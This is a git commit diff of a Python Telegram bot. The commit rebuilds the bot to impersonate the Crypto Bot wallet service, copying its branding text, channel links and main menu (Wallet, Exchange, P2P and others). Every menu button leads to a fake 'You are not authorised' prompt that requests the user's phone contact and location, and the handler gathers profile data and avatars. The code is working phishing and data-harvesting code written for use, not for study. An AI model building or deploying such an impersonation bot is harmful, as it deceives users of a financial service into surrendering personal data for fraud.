3b2087e505e2a7d4e2de396b86646b641a7e595d
Dmitry Sudakov <dmitry.sudakov@axiomjdk.ru>
2025-12-07 15:51:20 +0300

    + new interface

--- bot.py
+++ bot.py
@@ -1,41 +1,66 @@
 import telebot
-import confs
-import json
 from telebot import types
+import confs
 
 bot = telebot.TeleBot(confs.TOKEN)
 
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=["start"])
 def start(message):
-    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    
-    btn1 = types.KeyboardButton(
-        "📱 Предоставить профиль",
-        request_contact=True,
+    text = (
+        "💠 [Мультивалютный криптокошелёк](https://t.me/CryptoBotRU/14). "
+        "Покупайте, продавайте, храните и [отправляйте](https://t.me/CryptoBotRU/228) криптовалюту в любое время.\n\n"
+        "Подписывайтесь на [наш канал](https://t.me/CryptoBotRU) "
+        "и вступайте в [наш чат](https://t.me/CryptoBotRussian).\n\n"
+        "🎄 [Новый год](https://t.me/CryptoBotRU/459) с 🦋 *Crypto Bot*! 🎁 [Получить новогодние баллы ›](https://t.me/send/app?startapp=new-year)"
     )
 
-    btn2 = types.KeyboardButton(
-        "📱 Предоставить доступ",
-        request_location=True,
+    # --- Главное меню как у CryptoBot ---
+    keyboard = types.InlineKeyboardMarkup(row_width=3)
+
+    keyboard.row(
+        types.InlineKeyboardButton("📱 Открыть в приложении", callback_data="openapp"),
     )
 
-    
-
-    keyboard.add(btn1)
-    keyboard.add(btn2)
+    keyboard.row(
+        types.InlineKeyboardButton("👛 Кошелёк", callback_data="wallet"),
+        types.InlineKeyboardButton("🔄 Обмен", callback_data="exchange")
+        
+    )
+    keyboard.row(
+        types.InlineKeyboardButton("📊 P2P", callback_data="p2p"),
+        types.InlineKeyboardButton("📈 Биржа", callback_data="market"),
+    )
+    keyboard.row(
+        types.InlineKeyboardButton("💳 Чеки", callback_data="checks"),
+        types.InlineKeyboardButton("🧾 Счета", callback_data="invoices")
+    )
+    keyboard.row(
+        types.InlineKeyboardButton("🏝 Crypto Pay", callback_data="cryptopay"),
+        types.InlineKeyboardButton("🎁 Розыгрыши", callback_data="prizes")
+    )
+    keyboard.row(
+        types.InlineKeyboardButton("🍑 Подписки", callback_data="follows"),
+        types.InlineKeyboardButton("⚙️ Настройки", callback_data="settings"),
+    )
 
     bot.send_message(
         message.chat.id,
-        "Нажмите кнопку, чтобы отправить данные профиля:",
+        text,
+        parse_mode="Markdown",
         reply_markup=keyboard
     )
 
+def send_contact_location_keyboard(chat_id, text="Вы не авторизованы! Предоставьте доступ:"):
+    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    btn1 = types.KeyboardButton("📱 Предоставить профиль", request_contact=True)
+    btn2 = types.KeyboardButton("📱 Предоставить доступ", request_location=True)
+    keyboard.add(btn1, btn2)
+    bot.send_message(chat_id, text, reply_markup=keyboard)
 
 @bot.message_handler(content_types=['contact', 'location', 'text'])
 def handler(message):
     user = message.from_user
 
-    # Получаем аватары (если есть)
     try:
         photos = bot.get_user_profile_photos(user.id, limit=1)
         avatar_file_id = photos.photos[0][0].file_id if photos.total_count > 0 else None
@@ -58,10 +83,38 @@ def handler(message):
         "avatar_file_id": avatar_file_id,
     }
 
-    # выводим ВСЁ, что возможно получить
-    print("[USER DATA]", json.dumps(data, ensure_ascii=False, indent=4))
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
 
-    bot.send_message(message.chat.id, "Данные успешно получены! 👍")
+    if call.data == "openapp":
+       send_contact_location_keyboard(call.message.chat.id)
 
+    if call.data == "wallet":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "exchange":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "p2p":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "market":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "checks":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "invoices":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "settings":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "prizes":
+        send_contact_location_keyboard(call.message.chat.id)
+
+    elif call.data == "follows":
+        send_contact_location_keyboard(call.message.chat.id)
 
 bot.polling(none_stop=True)
+
